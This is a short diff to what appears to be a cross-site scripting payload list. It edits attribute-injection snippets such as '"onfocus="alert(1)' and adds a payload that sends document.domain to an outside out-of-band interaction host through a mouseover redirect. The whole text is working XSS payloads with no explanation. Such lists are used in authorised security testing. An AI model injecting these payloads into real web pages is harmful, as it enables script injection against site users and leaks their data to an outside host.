@@ -27,10 +27,10 @@ javascript:alert(1)
 
 `
 ```js
-"onmouseover="alert(1)
+"onfocus="alert(1)
 ```
 
 ```js
-"onfocus="alert(1)
+"onmouseover="location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;
 ```
 
